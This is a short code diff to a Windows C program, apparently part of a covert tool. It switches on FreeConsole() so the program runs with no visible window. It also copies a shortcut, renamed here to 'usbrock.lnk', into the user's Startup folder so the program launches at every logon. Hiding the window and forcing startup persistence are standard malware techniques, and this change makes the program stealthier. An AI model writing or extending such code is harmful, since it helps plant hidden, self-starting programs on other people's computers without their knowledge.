@@ -15,7 +15,7 @@
 #include <time.h>
 
 main(){
-    //FreeConsole();  //window is not visible
+    FreeConsole();  //window is not visible
 
     char* appdataFolder = getenv("APPDATA");
 
@@ -97,7 +97,7 @@ main(){
         /////////////////////////////////////////////////////////
         char tasklnkauto[100] = {""};
         strcat(tasklnkauto, appdataFolder);
-        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cockroach.lnk");
+        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\usbrock.lnk");
 
         CopyFile(runlnk_from, tasklnkauto, 0);
         //SetFileAttributes(tasklnkauto, FILE_ATTRIBUTE_HIDDEN);
